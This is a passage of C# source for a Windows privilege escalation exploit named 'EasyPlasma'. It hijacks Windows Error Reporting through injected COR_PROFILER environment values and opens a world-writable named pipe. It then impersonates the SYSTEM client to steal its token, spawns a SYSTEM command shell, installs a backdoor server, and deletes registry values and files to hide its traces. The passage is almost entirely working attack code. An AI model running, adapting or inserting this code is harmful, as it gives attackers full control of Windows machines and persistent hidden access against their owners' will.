            File.WriteAllText(@"C:\ProgramData\ep_system_ran.txt",
                $"ran as SYSTEM at {DateTime.Now}\nargs: {string.Join(" ",args)}\n");
            /* First: connect back to escalation pipe if one is waiting */
            try {
                using (var esc = new NamedPipeClientStream(".", PipeEsc, PipeDirection.InOut)) {
                    esc.Connect(5000);
                    File.AppendAllText(@"C:\ProgramData\ep_system_ran.txt","pipe connected\n");
                    byte[] ack = new byte[1];
                    esc.Read(ack, 0, 1);
                    File.AppendAllText(@"C:\ProgramData\ep_system_ran.txt","ack received\n");
                }
            } catch(Exception ex) {
                File.AppendAllText(@"C:\ProgramData\ep_system_ran.txt",$"pipe error: {ex.Message}\n");
            }
            InstallBackdoor(IntPtr.Zero);
            RunSrvServer();
            return;
        }

        if (mode=="install")  { Install();   return; }
        if (mode=="update")   { Update();    return; }
        if (mode=="--unpriv"||mode=="unpriv") { Uninstall(); return; }
        if (mode=="--prep")   { Prep();      return; }

        Console.WriteLine("=== EasyPlasma ===\n");

        /* Fast path: backdoor srv server already running */
        Console.WriteLine("[*] Checking for existing SYSTEM session...");
        if (TryFastPath()) return;
        Console.WriteLine("[*] No session found. Running full escalation...\n");

        /* Create escalation pipe server with open DACL so SYSTEM can connect */
        NamedPipeServerStream escPipe = null;
        try {
            var ps = new PipeSecurity();
            /* Allow Everyone full control - SYSTEM must be able to connect from session 0 */
            ps.AddAccessRule(new PipeAccessRule(
                new SecurityIdentifier(WellKnownSidType.WorldSid, null),
                PipeAccessRights.FullControl, AccessControlType.Allow));
            escPipe = new NamedPipeServerStream(PipeEsc, PipeDirection.InOut, 1,
                PipeTransmissionMode.Byte, PipeOptions.None, 64, 64, ps);
        } catch (Exception ex) {
            Console.WriteLine($"[-] Could not create escalation pipe: {ex.Message}"); return;
        }

        string id = Guid.NewGuid().ToString("N").Substring(0,8);
        string runDir = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "mp_"+id);
        Directory.CreateDirectory(runDir);

        /* Run MiniPlasma */
        if (!RunMiniPlasma(runDir)) {
            escPipe.Dispose(); return;
        }

        /* Wait for SYSTEM wermgr.exe to connect (give WER up to 25s to fire) */
        Console.WriteLine("[*] Waiting for SYSTEM to connect...");
        if (!escPipe.WaitForConnectionAsync().Wait(25000)) {
            Console.WriteLine("[-] Timed out waiting for SYSTEM");
            escPipe.Dispose();
            try{RecDelete(CF);}catch{}
            try{RecDelete(TK);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
            try{Directory.Delete(runDir,true);}catch{}
            if (File.Exists(@"C:\ProgramData\ep_system_ran.txt")) {
                Console.WriteLine("[*] Debug (wermgr.exe did run):");
                Console.WriteLine(File.ReadAllText(@"C:\ProgramData\ep_system_ran.txt"));
            } else {
                Console.WriteLine("[-] WER never ran our wermgr.exe (ep_system_ran.txt missing)");
            }
            return;
        }
        Console.WriteLine("[+] SYSTEM connected");

        /* Steal SYSTEM token via ImpersonateNamedPipeClient */
        IntPtr systemToken = IntPtr.Zero;
        if (!ImpersonateNamedPipeClient(escPipe.SafePipeHandle.DangerousGetHandle())) {
            Console.WriteLine($"[-] ImpersonateNamedPipeClient failed: {Marshal.GetLastWin32Error()}");
            escPipe.Dispose();
            try{RecDelete(CF);}catch{}
            try{RecDelete(TK);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
            try{Directory.Delete(runDir,true);}catch{}
            return;
        }

        IntPtr impToken;
        OpenThreadToken(GetCurrentThread(), 0xF01FF, false, out impToken);
        DuplicateTokenEx(impToken, 0x10000000, IntPtr.Zero, 2, 1, out systemToken);
        CloseHandle(impToken);
        RevertToSelf();

        /* Set session to current interactive session */
        uint session = WTSGetActiveConsoleSessionId();
        SetTokenInformation(systemToken, 12, ref session, 4);

        /* Signal SYSTEM wermgr.exe that it can exit */
        try { escPipe.Write(new byte[]{1}, 0, 1); escPipe.Flush(); } catch {}
        escPipe.Dispose();

        /* Clean up everything now that SYSTEM has connected and been launched */
        Thread.Sleep(500);
        try{RecDelete(CF);}catch{}
        try{RecDelete(TK);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("windir",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Environment",true)?.DeleteValue("SystemRoot",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_ENABLE_PROFILING",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER",false);}catch{}
        try{Registry.Users.OpenSubKey(@".DEFAULT\\Volatile Environment",true)?.DeleteValue("COR_PROFILER_PATH",false);}catch{}
        try{File.Delete(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),"ep_prof.dll"));}catch{}
        try{Directory.Delete(runDir,true);}catch{}

        /* Spawn SYSTEM cmd in this console */
        Console.WriteLine("[+] Got SYSTEM token. Launching shell...\n");
        SpawnSystemShell(systemToken);
    }
}
